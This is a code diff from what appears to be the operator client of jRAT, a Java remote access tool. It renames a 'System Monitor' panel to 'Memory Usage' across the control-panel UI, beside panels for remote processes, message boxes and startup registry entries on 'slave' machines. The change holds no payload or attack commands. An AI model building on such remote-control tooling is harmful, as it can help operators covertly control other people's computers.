@@ -71,7 +71,7 @@ import se.jrat.client.ui.panels.PanelControlMessagebox;
 import se.jrat.client.ui.panels.PanelControlMonitors;
 import se.jrat.client.ui.panels.PanelControlNetGateway;
 import se.jrat.client.ui.panels.PanelControlParent;
-import se.jrat.client.ui.panels.PanelControlPerformance;
+import se.jrat.client.ui.panels.PanelMemoryUsage;
 import se.jrat.client.ui.panels.PanelControlPiano;
 import se.jrat.client.ui.panels.PanelControlPrinter;
 import se.jrat.client.ui.panels.PanelControlRegStart;
@@ -276,7 +276,7 @@ public class FrameControlPanel extends BaseFrame {
 				r.icons.put("control panel", IconUtils.getIcon("controlpanel"));
 				r.icons.put("system", IconUtils.getIcon("info"));
 				r.icons.put("system info", IconUtils.getIcon("computer"));
-				r.icons.put("system monitor", IconUtils.getIcon("meter"));
+				r.icons.put("memory usage", IconUtils.getIcon("meter"));
 				r.icons.put("fun manager", IconUtils.getIcon("smiley"));
 				r.icons.put("fun", IconUtils.getIcon("fun"));
 				r.icons.put("messagebox", IconUtils.getIcon("messagebox"));
@@ -363,7 +363,7 @@ public class FrameControlPanel extends BaseFrame {
 		if (str.equals("system")) {
 			tabbedPane.removeAll();
 			tabbedPane.addTab("System Info", i.get("system info"), panels.get("system info"));
-			tabbedPane.addTab("System Info", i.get("system monitor"), panels.get("system monitor"));
+			tabbedPane.addTab("Memory Usage", i.get("memory usage"), panels.get("memory usage"));
 			tabbedPane.addTab("Drives", i.get("drives"), panels.get("drives"));
 			tabbedPane.addTab("Monitors", i.get("monitors"), panels.get("monitors"));
 			tabbedPane.addTab("JVM Info", i.get("jvm info"), panels.get("jvm info"));
@@ -433,7 +433,7 @@ public class FrameControlPanel extends BaseFrame {
 		n.add(systeminfo);
 
 		systeminfo.add(getTreeNode("System Info"));
-		systeminfo.add(getTreeNode("System Monitor"));
+		systeminfo.add(getTreeNode("Memory Usage"));
 		systeminfo.add(getTreeNode("Environment Variables"));
 		systeminfo.add(getTreeNode("System Properties"));
 		systeminfo.add(getTreeNode("Drives"));
@@ -534,7 +534,7 @@ public class FrameControlPanel extends BaseFrame {
 		panels.clear();
 		try {
 			addPanel("system info", new PanelControlSystemInfo(slave));
-			addPanel("system monitor", new PanelControlPerformance(slave));
+			addPanel("memory usage", new PanelMemoryUsage(slave));
 			addPanel("fun manager", new PanelControlFunManager(slave));
 			addPanel("messagebox", new PanelControlMessagebox(slave));
 			addPanel("remote process", new PanelControlRemoteProcess(slave));
